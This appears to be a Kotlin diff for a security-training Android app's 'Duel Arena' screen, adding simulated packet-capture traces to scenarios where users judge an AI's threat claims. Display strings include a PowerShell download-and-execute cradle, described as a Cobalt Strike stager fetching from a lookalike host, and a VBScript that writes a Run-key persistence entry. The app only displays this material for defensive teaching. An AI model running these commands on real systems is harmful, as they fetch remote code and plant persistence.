@@ -19,6 +19,8 @@ import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.graphics.graphicsLayer
+import androidx.compose.ui.hapticfeedback.HapticFeedbackType
+import androidx.compose.ui.platform.LocalHapticFeedback
 import androidx.compose.ui.platform.testTag
 import androidx.compose.ui.text.font.FontFamily
 import androidx.compose.ui.text.font.FontWeight
@@ -26,6 +28,8 @@ import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import com.example.data.AegoraRepository
 import com.example.subscription.AegoraSubscriptionRepository
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.launch
 
 /**
  * 1. The Async Adversary Duel Arena
@@ -44,6 +48,9 @@ fun DuelArenaScreen(
   val slateBorder = Color(0xFF2D313A)
   val cobaltBlue = Color(0xFF2962FF)
 
+  val haptic = LocalHapticFeedback.current
+  val coroutineScope = rememberCoroutineScope()
+
   val subscriptionState by AegoraSubscriptionRepository.subscriptionState.collectAsState()
   val duelsEngaged by AegoraSubscriptionRepository.adversaryDuelsEngaged.collectAsState()
 
@@ -54,6 +61,9 @@ fun DuelArenaScreen(
   var hasDecodedPayload by remember { mutableStateOf(false) }
   var duelOutcome by remember { mutableStateOf<String?>(null) }
   var isCorrectDecision by remember { mutableStateOf<Boolean?>(null) }
+  var showPcapTrace by remember { mutableStateOf(false) }
+  var isStreamingPcap by remember { mutableStateOf(false) }
+  val streamedPackets = remember { mutableStateListOf<ScapyParsedPacket>() }
 
   val duelSeeds = listOf(
     DuelScenario(
@@ -69,7 +79,73 @@ fun DuelArenaScreen(
       decodedPayload = "DECODED TELEMETRY INSPECTION:\nStandard Azure Active Directory token refresh handshake. TLS 1.3 certificate signed by Microsoft RSA TLS CA 02.",
       aiClaim = "High: Outbound beaconing to Lazarus C2 domain masquerading as Microsoft Graph.",
       isAiHallucinating = true,
-      explanation = "AI Hallucination Caught! Destination IP resolves to legitimate Microsoft Entra ID authentication cluster. The AI misclassified standard OAuth renewal as an APT beacon."
+      explanation = "AI Hallucination Caught! Destination IP resolves to legitimate Microsoft Entra ID authentication cluster. The AI misclassified standard OAuth renewal as an APT beacon.",
+      pcapPackets = listOf(
+        ScapyParsedPacket(
+          number = 1,
+          timestamp = "14:18:44.102",
+          protocol = "TCP",
+          flags = "[SYN]",
+          ethSrc = "00:0c:29:4f:8e:12",
+          ethDst = "00:50:56:c0:00:08",
+          ipSrc = "10.0.4.18:49822",
+          ipDst = "20.190.159.23:443",
+          layers = "Ethernet / IP / TCP",
+          summary = "Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM=1"
+        ),
+        ScapyParsedPacket(
+          number = 2,
+          timestamp = "14:18:44.128",
+          protocol = "TCP",
+          flags = "[SYN, ACK]",
+          ethSrc = "00:50:56:c0:00:08",
+          ethDst = "00:0c:29:4f:8e:12",
+          ipSrc = "20.190.159.23:443",
+          ipDst = "10.0.4.18:49822",
+          layers = "Ethernet / IP / TCP",
+          summary = "Seq=0 Ack=1 Win=65535 Len=0 MSS=1400"
+        ),
+        ScapyParsedPacket(
+          number = 3,
+          timestamp = "14:18:44.129",
+          protocol = "TCP",
+          flags = "[ACK]",
+          ethSrc = "00:0c:29:4f:8e:12",
+          ethDst = "00:50:56:c0:00:08",
+          ipSrc = "10.0.4.18:49822",
+          ipDst = "20.190.159.23:443",
+          layers = "Ethernet / IP / TCP",
+          summary = "Seq=1 Ack=1 Win=64240 Len=0 [3-Way Handshake Established]"
+        ),
+        ScapyParsedPacket(
+          number = 4,
+          timestamp = "14:18:44.135",
+          protocol = "TLS",
+          flags = "[PSH, ACK]",
+          ethSrc = "00:0c:29:4f:8e:12",
+          ethDst = "00:50:56:c0:00:08",
+          ipSrc = "10.0.4.18:49822",
+          ipDst = "20.190.159.23:443",
+          layers = "Ethernet / IP / TCP / TLS / ClientHello",
+          summary = "TLSv1.3 Handshake Client Hello [SNI: login.microsoftonline.com]",
+          payloadHex = "16 03 01 02 00 01 00 01 fc 03 03...",
+          payloadAscii = "...login.microsoftonline.com..."
+        ),
+        ScapyParsedPacket(
+          number = 5,
+          timestamp = "14:18:44.180",
+          protocol = "TLS",
+          flags = "[PSH, ACK]",
+          ethSrc = "00:50:56:c0:00:08",
+          ethDst = "00:0c:29:4f:8e:12",
+          ipSrc = "20.190.159.23:443",
+          ipDst = "10.0.4.18:49822",
+          layers = "Ethernet / IP / TCP / TLS / ServerHello",
+          summary = "TLSv1.3 Server Hello + Certificate [Issuer: Microsoft RSA TLS CA 02]",
+          payloadHex = "16 03 03 00 7a 02 00 00 76 03 03...",
+          payloadAscii = "...CN=Microsoft RSA TLS CA 02..."
+        )
+      )
     ),
     DuelScenario(
       id = "SEED_APT29",
@@ -84,7 +160,75 @@ fun DuelArenaScreen(
       decodedPayload = "DECODED (-EncodedCommand):\nIEX (New-Object System.Net.WebClient).DownloadString('https://telemetry-cdn.internal-azure.net/beacon.ps1'); # Cobalt Strike Stager V4.9 - Port 443 HTTPS",
       aiClaim = "Critical: Cobalt Strike beaconing detected via encoded PowerShell execution.",
       isAiHallucinating = false,
-      explanation = "Accurate Detection! WINWORD.EXE spawning an encoded hidden PowerShell process contacting an unverified CDN endpoint matches MITRE T1059.001 & T1071.001."
+      explanation = "Accurate Detection! WINWORD.EXE spawning an encoded hidden PowerShell process contacting an unverified CDN endpoint matches MITRE T1059.001 & T1071.001.",
+      pcapPackets = listOf(
+        ScapyParsedPacket(
+          number = 1,
+          timestamp = "09:34:02.040",
+          protocol = "TCP",
+          flags = "[SYN]",
+          ethSrc = "00:0c:29:4f:8e:12",
+          ethDst = "fe:00:1a:2b:3c:4d",
+          ipSrc = "10.0.4.18:51204",
+          ipDst = "185.220.101.42:443",
+          layers = "Ethernet / IP / TCP",
+          summary = "Seq=0 Win=64240 Len=0 MSS=1460"
+        ),
+        ScapyParsedPacket(
+          number = 2,
+          timestamp = "09:34:02.088",
+          protocol = "TCP",
+          flags = "[SYN, ACK]",
+          ethSrc = "fe:00:1a:2b:3c:4d",
+          ethDst = "00:0c:29:4f:8e:12",
+          ipSrc = "185.220.101.42:443",
+          ipDst = "10.0.4.18:51204",
+          layers = "Ethernet / IP / TCP",
+          summary = "Seq=0 Ack=1 Win=14600 Len=0"
+        ),
+        ScapyParsedPacket(
+          number = 3,
+          timestamp = "09:34:02.089",
+          protocol = "TCP",
+          flags = "[ACK]",
+          ethSrc = "00:0c:29:4f:8e:12",
+          ethDst = "fe:00:1a:2b:3c:4d",
+          ipSrc = "10.0.4.18:51204",
+          ipDst = "185.220.101.42:443",
+          layers = "Ethernet / IP / TCP",
+          summary = "Seq=1 Ack=1 Win=64240 Len=0 [Handshake Complete]"
+        ),
+        ScapyParsedPacket(
+          number = 4,
+          timestamp = "09:34:02.115",
+          protocol = "HTTP",
+          flags = "[PSH, ACK]",
+          ethSrc = "00:0c:29:4f:8e:12",
+          ethDst = "fe:00:1a:2b:3c:4d",
+          ipSrc = "10.0.4.18:51204",
+          ipDst = "185.220.101.42:443",
+          layers = "Ethernet / IP / TCP / Raw",
+          summary = "GET /beacon.ps1 HTTP/1.1 (Host: telemetry-cdn.internal-azure.net)",
+          payloadHex = "47 45 54 20 2f 62 65 61 63 6f 6e 2e 70 73 31...",
+          payloadAscii = "GET /beacon.ps1 HTTP/1.1\r\nHost: telemetry-cdn.internal-azure.net\r\n...",
+          isSuspicious = true
+        ),
+        ScapyParsedPacket(
+          number = 5,
+          timestamp = "09:34:02.164",
+          protocol = "RAW",
+          flags = "[PSH, ACK]",
+          ethSrc = "fe:00:1a:2b:3c:4d",
+          ethDst = "00:0c:29:4f:8e:12",
+          ipSrc = "185.220.101.42:443",
+          ipDst = "10.0.4.18:51204",
+          layers = "Ethernet / IP / TCP / Raw",
+          summary = "Cobalt Strike HTTPS Stager Ingestion [Length: 512 bytes]",
+          payloadHex = "49 45 58 20 28 4e 65 77 2d 4f 62 6a 65 63 74...",
+          payloadAscii = "IEX (New-Object System.Net.WebClient).DownloadString('https://telemetry-cdn.internal-azure.net/beacon.ps1'); # Stager V4.9",
+          isSuspicious = true
+        )
+      )
     ),
     DuelScenario(
       id = "SEED_FIN7",
@@ -96,11 +240,65 @@ fun DuelArenaScreen(
       decodedPayload = "DECODED SCRIPT:\nDim obj: Set obj = WScript.CreateObject(\"WScript.Shell\"): obj.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\TelemetrySync\", \"cache.vbs\"",
       aiClaim = "Critical: Living-Off-The-Land (LOLBin) mshta persistence via Run key registry injection.",
       isAiHallucinating = false,
-      explanation = "Correct! The AI correctly identified mshta.exe executing inline VBScript to drop persistent registry execution in HKCU Run key."
+      explanation = "Correct! The AI correctly identified mshta.exe executing inline VBScript to drop persistent registry execution in HKCU Run key.",
+      pcapPackets = listOf(
+        ScapyParsedPacket(
+          number = 1,
+          timestamp = "22:04:11.012",
+          protocol = "TCP",
+          flags = "[SYN]",
+          ethSrc = "00:0c:29:4f:8e:12",
+          ethDst = "c4:72:95:81:0b:33",
+          ipSrc = "10.0.4.18:50811",
+          ipDst = "194.26.29.112:8080",
+          layers = "Ethernet / IP / TCP",
+          summary = "Seq=0 Win=64240 Len=0 MSS=1460"
+        ),
+        ScapyParsedPacket(
+          number = 2,
+          timestamp = "22:04:11.054",
+          protocol = "TCP",
+          flags = "[SYN, ACK]",
+          ethSrc = "c4:72:95:81:0b:33",
+          ethDst = "00:0c:29:4f:8e:12",
+          ipSrc = "194.26.29.112:8080",
+          ipDst = "10.0.4.18:50811",
+          layers = "Ethernet / IP / TCP",
+          summary = "Seq=0 Ack=1 Win=29200 Len=0"
+        ),
+        ScapyParsedPacket(
+          number = 3,
+          timestamp = "22:04:11.091",
+          protocol = "HTTP",
+          flags = "[PSH, ACK]",
+          ethSrc = "c4:72:95:81:0b:33",
+          ethDst = "00:0c:29:4f:8e:12",
+          ipSrc = "194.26.29.112:8080",
+          ipDst = "10.0.4.18:50811",
+          layers = "Ethernet / IP / TCP / Raw",
+          summary = "HTTP 200 OK - cache.vbs dropper binary payload payload stream",
+          payloadHex = "44 69 6d 20 6f 62 6a 3a 20 53 65 74...",
+          payloadAscii = "Dim obj: Set obj = WScript.CreateObject(\"WScript.Shell\")...",
+          isSuspicious = true
+        )
+      )
     )
   )
 
   val currentScenario = duelSeeds[activeSeedIndex % duelSeeds.size]
+
+  fun ingestPcapTrace() {
+    showPcapTrace = true
+    streamedPackets.clear()
+    isStreamingPcap = true
+    coroutineScope.launch {
+      for (pkt in currentScenario.pcapPackets) {
+        delay(120)
+        streamedPackets.add(pkt)
+      }
+      isStreamingPcap = false
+    }
+  }
 
   fun handleDuelDecision(userAcceptedClaim: Boolean) {
     // RevenueCat Gate Check
@@ -208,9 +406,12 @@ fun DuelArenaScreen(
           modifier = Modifier
             .weight(1f)
             .clickable {
+              haptic.performHapticFeedback(HapticFeedbackType.TextHandleMove)
               activeSeedIndex = index
               duelOutcome = null
               hasDecodedPayload = false
+              showPcapTrace = false
+              streamedPackets.clear()
             }
         ) {
           Text(
@@ -247,45 +448,194 @@ fun DuelArenaScreen(
           horizontalArrangement = Arrangement.SpaceBetween,
           verticalAlignment = Alignment.CenterVertically
         ) {
-          Text(
-            text = "SIEM // EDR TELEMETRY STREAM",
-            color = Color(0xFF8A919E),
-            fontSize = 10.sp,
-            fontFamily = FontFamily.Monospace
-          )
-          Text(
-            text = if (hasDecodedPayload) "[ HIDE DECODED ]" else "[ DECODE BASE64 ]",
-            color = Color(0xFF00E676),
-            fontSize = 10.sp,
-            fontWeight = FontWeight.Bold,
-            fontFamily = FontFamily.Monospace,
-            modifier = Modifier.clickable { hasDecodedPayload = !hasDecodedPayload }
-          )
-        }
-
-        Text(
-          text = currentScenario.rawTelemetry,
-          color = Color(0xFF00E676),
-          fontFamily = FontFamily.Monospace,
-          fontSize = 12.sp,
-          lineHeight = 18.sp
-        )
-
-        AnimatedVisibility(visible = hasDecodedPayload) {
-          Surface(
-            shape = RoundedCornerShape(4.dp),
-            color = Color(0x2200E676),
-            border = BorderStroke(0.8.dp, Color(0x5500E676)),
-            modifier = Modifier.fillMaxWidth().padding(top = 8.dp)
+          Row(
+            verticalAlignment = Alignment.CenterVertically,
+            horizontalArrangement = Arrangement.spacedBy(6.dp)
           ) {
             Text(
-              text = currentScenario.decodedPayload,
-              color = Color(0xFFB9F6CA),
-              fontFamily = FontFamily.Monospace,
-              fontSize = 11.sp,
-              lineHeight = 16.sp,
-              modifier = Modifier.padding(10.dp)
+              text = if (showPcapTrace) "PCAP // SCAPY 2.5 DISSECTION" else "SIEM // EDR TELEMETRY STREAM",
+              color = if (showPcapTrace) Color(0xFF22D3EE) else Color(0xFF8A919E),
+              fontSize = 10.sp,
+              fontWeight = FontWeight.Bold,
+              fontFamily = FontFamily.Monospace
             )
+            if (isStreamingPcap) {
+              CircularProgressIndicator(
+                modifier = Modifier.size(10.dp),
+                color = Color(0xFF22D3EE),
+                strokeWidth = 1.5.dp
+              )
+            }
+          }
+
+          Row(
+            horizontalArrangement = Arrangement.spacedBy(8.dp),
+            verticalAlignment = Alignment.CenterVertically
+          ) {
+            // Button: [ INGEST .PCAP TRACE ]
+            Surface(
+              shape = RoundedCornerShape(4.dp),
+              color = if (showPcapTrace) Color(0x3322D3EE) else Color(0x222962FF),
+              border = BorderStroke(1.dp, if (showPcapTrace) Color(0xFF22D3EE) else Color(0xFF2962FF)),
+              modifier = Modifier
+                .clickable {
+                  haptic.performHapticFeedback(HapticFeedbackType.TextHandleMove)
+                  if (!showPcapTrace) {
+                    ingestPcapTrace()
+                  } else {
+                    showPcapTrace = false
+                  }
+                }
+                .testTag("duel_ingest_pcap_btn")
+            ) {
+              Text(
+                text = if (showPcapTrace) "[ SHOW SIEM ]" else "[ INGEST .PCAP TRACE ]",
+                color = if (showPcapTrace) Color(0xFF22D3EE) else Color(0xFF82B1FF),
+                fontSize = 10.sp,
+                fontWeight = FontWeight.Bold,
+                fontFamily = FontFamily.Monospace,
+                modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
+              )
+            }
+
+            Text(
+              text = if (hasDecodedPayload) "[ HIDE DECODED ]" else "[ DECODE BASE64 ]",
+              color = Color(0xFF00E676),
+              fontSize = 10.sp,
+              fontWeight = FontWeight.Bold,
+              fontFamily = FontFamily.Monospace,
+              modifier = Modifier.clickable {
+                haptic.performHapticFeedback(HapticFeedbackType.TextHandleMove)
+                hasDecodedPayload = !hasDecodedPayload
+              }
+            )
+          }
+        }
+
+        if (showPcapTrace) {
+          // PCAP Streamed Output
+          Text(
+            text = "> SCAPY CAPTURE FILE: /traces/${currentScenario.id.lowercase()}.pcap\n" +
+              "> DETERMINISTIC DISSECTION STREAM INGESTED (${streamedPackets.size}/${currentScenario.pcapPackets.size} FRAMES)",
+            color = Color(0xFF22D3EE),
+            fontFamily = FontFamily.Monospace,
+            fontSize = 11.sp,
+            fontWeight = FontWeight.Bold,
+            lineHeight = 16.sp
+          )
+
+          streamedPackets.forEach { pkt ->
+            Surface(
+              shape = RoundedCornerShape(6.dp),
+              color = if (pkt.isSuspicious) Color(0x22FF1744) else Color(0x1522D3EE),
+              border = BorderStroke(0.8.dp, if (pkt.isSuspicious) Color(0x88FF1744) else Color(0x4422D3EE)),
+              modifier = Modifier.fillMaxWidth().padding(vertical = 3.dp)
+            ) {
+              Column(modifier = Modifier.padding(8.dp), verticalArrangement = Arrangement.spacedBy(4.dp)) {
+                Row(
+                  modifier = Modifier.fillMaxWidth(),
+                  horizontalArrangement = Arrangement.SpaceBetween
+                ) {
+                  Text(
+                    text = "FRAME #${pkt.number} • ${pkt.timestamp} • ${pkt.protocol} ${pkt.flags}",
+                    color = if (pkt.isSuspicious) Color(0xFFFF5252) else Color(0xFF67E8F9),
+                    fontSize = 10.sp,
+                    fontWeight = FontWeight.Bold,
+                    fontFamily = FontFamily.Monospace
+                  )
+                  Text(
+                    text = pkt.layers,
+                    color = Color(0xFF8A919E),
+                    fontSize = 9.sp,
+                    fontFamily = FontFamily.Monospace
+                  )
+                }
+
+                Text(
+                  text = "ETH: ${pkt.ethSrc} -> ${pkt.ethDst} | IP: ${pkt.ipSrc} -> ${pkt.ipDst}",
+                  color = Color(0xFFB0BEC5),
+                  fontSize = 10.sp,
+                  fontFamily = FontFamily.Monospace
+                )
+
+                Text(
+                  text = "TCP: ${pkt.summary}",
+                  color = Color(0xFFE0E0E0),
+                  fontSize = 10.sp,
+                  fontFamily = FontFamily.Monospace
+                )
+
+                if (pkt.payloadHex.isNotBlank()) {
+                  Surface(
+                    shape = RoundedCornerShape(4.dp),
+                    color = Color(0x33000000),
+                    border = BorderStroke(0.5.dp, Color(0x33FFFFFF)),
+                    modifier = Modifier.fillMaxWidth().padding(top = 2.dp)
+                  ) {
+                    Column(modifier = Modifier.padding(6.dp)) {
+                      Text(
+                        text = "HEX: ${pkt.payloadHex}",
+                        color = Color(0xFF8A919E),
+                        fontSize = 9.sp,
+                        fontFamily = FontFamily.Monospace
+                      )
+                      Text(
+                        text = "ASCII: ${pkt.payloadAscii}",
+                        color = Color(0xFF00E676),
+                        fontSize = 10.sp,
+                        fontFamily = FontFamily.Monospace
+                      )
+                    }
+                  }
+                }
+
+                if (pkt.isSuspicious) {
+                  Text(
+                    text = "🚨 SCAPY FORENSICS: C2 BEACON STAGER DETECTED (MITRE T1071.001)",
+                    color = Color(0xFFFF5252),
+                    fontSize = 10.sp,
+                    fontWeight = FontWeight.Bold,
+                    fontFamily = FontFamily.Monospace
+                  )
+                }
+              }
+            }
+          }
+
+          if (isStreamingPcap) {
+            Text(
+              text = "> [INGESTING NEXT PCAP FRAME VIA SCAPY ENGINE...]",
+              color = Color(0xFF82B1FF),
+              fontFamily = FontFamily.Monospace,
+              fontSize = 10.sp
+            )
+          }
+        } else {
+          // Standard SIEM EDR Text
+          Text(
+            text = currentScenario.rawTelemetry,
+            color = Color(0xFF00E676),
+            fontFamily = FontFamily.Monospace,
+            fontSize = 12.sp,
+            lineHeight = 18.sp
+          )
+
+          AnimatedVisibility(visible = hasDecodedPayload) {
+            Surface(
+              shape = RoundedCornerShape(4.dp),
+              color = Color(0x2200E676),
+              border = BorderStroke(0.8.dp, Color(0x5500E676)),
+              modifier = Modifier.fillMaxWidth().padding(top = 8.dp)
+            ) {
+              Text(
+                text = currentScenario.decodedPayload,
+                color = Color(0xFFB9F6CA),
+                fontFamily = FontFamily.Monospace,
+                fontSize = 11.sp,
+                lineHeight = 16.sp,
+                modifier = Modifier.padding(10.dp)
+              )
+            }
           }
         }
       }
@@ -385,7 +735,10 @@ fun DuelArenaScreen(
       horizontalArrangement = Arrangement.spacedBy(12.dp)
     ) {
       Button(
-        onClick = { handleDuelDecision(userAcceptedClaim = true) },
+        onClick = {
+          haptic.performHapticFeedback(HapticFeedbackType.TextHandleMove)
+          handleDuelDecision(userAcceptedClaim = true)
+        },
         modifier = Modifier
           .weight(1f)
           .height(50.dp)
@@ -398,7 +751,10 @@ fun DuelArenaScreen(
       }
 
       Button(
-        onClick = { handleDuelDecision(userAcceptedClaim = false) },
+        onClick = {
+          haptic.performHapticFeedback(HapticFeedbackType.LongPress)
+          handleDuelDecision(userAcceptedClaim = false)
+        },
         modifier = Modifier
           .weight(1f)
           .height(50.dp)
@@ -412,6 +768,22 @@ fun DuelArenaScreen(
   }
 }
 
+data class ScapyParsedPacket(
+  val number: Int,
+  val timestamp: String,
+  val protocol: String,
+  val flags: String,
+  val ethSrc: String,
+  val ethDst: String,
+  val ipSrc: String,
+  val ipDst: String,
+  val layers: String,
+  val summary: String,
+  val payloadHex: String = "",
+  val payloadAscii: String = "",
+  val isSuspicious: Boolean = false
+)
+
 private data class DuelScenario(
   val id: String,
   val adversary: String,
@@ -419,5 +791,6 @@ private data class DuelScenario(
   val decodedPayload: String,
   val aiClaim: String,
   val isAiHallucinating: Boolean,
-  val explanation: String
+  val explanation: String,
+  val pcapPackets: List<ScapyParsedPacket> = emptyList()
 )
